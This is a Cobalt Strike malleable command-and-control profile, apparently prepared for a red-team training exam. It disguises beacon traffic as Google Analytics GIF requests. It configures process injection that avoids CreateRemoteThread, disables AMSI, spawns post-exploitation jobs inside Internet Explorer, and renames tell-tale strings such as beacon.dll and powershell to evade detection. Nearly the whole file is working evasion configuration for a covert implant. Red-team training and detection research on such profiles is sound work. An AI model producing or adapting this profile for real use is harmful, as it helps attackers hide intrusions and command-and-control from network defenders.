# Cobalt Strike 4.1-Compatible Profile - RTO-170 v2
# Author@ 54N4L

# --- Beacon Sleep / Jitter ---
set sleeptime "45000";   # 45s between callbacks
set jitter    "20";      # +/-20% jitter

# --- HTTP Traffic Configuration ---
http-get {
    set uri "/__utm.gif";
    client {
        parameter "utmac" "UA-2202604-2";
        parameter "utmcn" "1";
        parameter "utmcs" "ISO-8859-1";
        parameter "utmsr" "1280x1024";
        parameter "utmsc" "32-bit";
        parameter "utmul" "en-US";
        metadata {
            netbios;
            prepend "__utma";
            parameter "utmcc";
        }
    }
    server {
        header "Content-Type" "image/gif";
        output {
            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
            print;
        }
    }
}

http-post {
    set uri "/___utm.gif";
    client {
        header "Content-Type" "application/octet-stream";
        id {
            prepend "UA-220";
            append "-2";
            parameter "utmac";
        }
        parameter "utmcn" "1";
        parameter "utmcs" "ISO-8859-1";
        parameter "utmsr" "1280x1024";
        parameter "utmsc" "32-bit";
        parameter "utmul" "en-US";
        output {
            print;
        }
    }
    server {
        header "Content-Type" "image/gif";
        output {
            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
            print;
        }
    }
}

http-stager {
    server {
        header "Content-Type" "image/gif";
    }
}

# --- Process Injection Behavior ---
process-inject {
    # Remote memory allocation
    set allocator "NtMapViewOfSection";  # stealthier than plain VirtualAllocEx
    set min_alloc "16384";
    set startrwx "false";
    set userwx  "false";

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90";
    }

    # IMPORTANT: avoid CreateRemoteThread to satisfy exam "Process Injection" check
    execute {
        # Self-injection / temporary processes
        CreateThread "ntdll.dll!RtlUserThreadStart";
        CreateThread;

        # Early-bird injection for suspended post-ex processes
        NtQueueApcThread-s;

        # Thread context hijack (no CreateRemoteThread)
        ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x1";
        SetThreadContext;
    }
}

# --- Post-Exploitation Behavior ---
post-ex {
    set amsi_disable "true";

    # Use a BROWSER process for post-ex jobs (exam hint), invade network defense
    set spawnto_x64 "%ProgramFiles%\\Internet Explorer\\iexplore.exe";
    set spawnto_x86 "%ProgramFiles(x86)%\\Internet Explorer\\iexplore.exe";

    # Pipe looks benign
    set pipename "mojo.5688.3108.3\\pipe\\mojo.5688.3108.3";

    set obfuscate   "true";
    set smartinject "true";
    set cleanup     "true";

    transform-x64 {
        strrep "ReflectiveLoader" "ServiceMain";
        strrep "System.Management.Automation" "System.Core.ServiceHost";
        strrep "powershell" "wksprv";
        strrep "ExecuteAssembly" "InvokeManaged";
        strrep "PowerPick" "PSEngine";
        strrep "beacon.dll" "wkscli.dll";
    }

    transform-x86 {
        strrep "ReflectiveLoader" "ServiceMain";
        strrep "System.Management.Automation" "System.Core.ServiceHost";
        strrep "powershell" "wksprv";
        strrep "ExecuteAssembly" "InvokeManaged";
        strrep "PowerPick" "PSEngine";
        strrep "beacon.dll" "wkscli.dll";
    }
}

# --- Beacon Stage Configuration ---
stage {
    set sleep_mask "true";
    set userwx     "false";
    set cleanup    "true";
    set obfuscate  "true";
    set module_x64 "xpsservices.dll";
    set allocator  "MapViewOfFile";

    transform-x64 {
        prepend "\x90\x90\x90";
        append  "\x90\x90\x90";
        strrep "ReflectiveLoader" "EntryPoint";
    }

    transform-x86 {
        prepend "\x90\x90\x90";
        append  "\x90\x90\x90";
        strrep "ReflectiveLoader" "EntryPoint";
    }
}